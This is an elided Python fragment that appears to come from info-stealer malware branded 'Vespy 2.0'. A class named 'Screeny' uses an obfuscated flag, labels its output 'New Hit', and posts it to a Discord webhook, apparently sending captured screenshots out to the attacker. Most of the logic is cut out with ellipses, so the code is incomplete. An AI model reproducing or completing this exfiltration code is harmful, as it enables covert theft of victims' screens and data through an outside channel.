class Screeny:
    ...
    def __init__(self):
        ...
        if jtjirjihirthr:
            ...
            content = "New Hit"
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1109262870883090465/1113545572192899072/forvespyservero.png",content=content)
        try:
            t=requests.get(r2)
